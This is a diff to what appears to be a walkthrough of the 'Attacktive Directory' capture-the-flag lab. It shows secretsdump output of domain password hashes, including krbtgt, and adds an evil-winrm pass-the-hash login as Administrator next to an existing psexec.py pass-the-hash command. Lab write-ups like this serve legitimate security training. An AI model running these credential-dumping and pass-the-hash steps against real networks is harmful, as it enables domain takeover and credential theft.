@@ -336,7 +336,7 @@ Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 Password:
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404XXXXX3b435b51404ee:e4876a80aXXXXX2986d7609aa5ebc12b:::
+Administrator:500:aad3b435b51404XXXXX3b435b51404ee:0e0363213e37bXXXXX497260b0bcb4fc:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
 spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
@@ -404,11 +404,45 @@ ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:a74b9a67c48f6c28c06f776b0cf03118
 ATTACKTIVEDIREC$:des-cbc-md5:f79219863426ecce
 [*] Cleaning up...
 ``` 
+### Login to admin with evil-winrm
+
+``` bash
+$ evil-winrm -i 10.10.126.37 -u Administrator -H 0e0363213e37bXXXXX497260b0bcb4fc
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami; hostname; whoami /groups
+thm-ad\administrator
+AttacktiveDirectory
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                    Type             SID                                          Attributes
+============================================= ================ ============================================ ===============================================================
+Everyone                                      Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                        Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Remote Desktop Users                  Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                                 Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                          Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+THM-AD\Group Policy Creator Owners            Group            S-1-5-21-3591857110-2884097990-301047963-520 Mandatory group, Enabled by default, Enabled group
+THM-AD\Domain Admins                          Group            S-1-5-21-3591857110-2884097990-301047963-512 Mandatory group, Enabled by default, Enabled group
+THM-AD\Enterprise Admins                      Group            S-1-5-21-3591857110-2884097990-301047963-519 Mandatory group, Enabled by default, Enabled group
+THM-AD\Schema Admins                          Group            S-1-5-21-3591857110-2884097990-301047963-518 Mandatory group, Enabled by default, Enabled group
+THM-AD\Denied RODC Password Replication Group Alias            S-1-5-21-3591857110-2884097990-301047963-572 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication              Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level          Label            S-1-16-12288
+``` 
 
 ### Login to admin with psexec.py
 
 ``` bash
-$ python3 psexec.py Administrator:@spookysec.local -hashes aad3b435b51404XXXXX3b435b51404ee:e4876a80aXXXXX2986d7609aa5ebc12b
+$ python3 psexec.py Administrator:@spookysec.local -hashes aad3b435b51404XXXXX3b435b51404ee:0e0363213e37bXXXXX497260b0bcb4fc
 
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
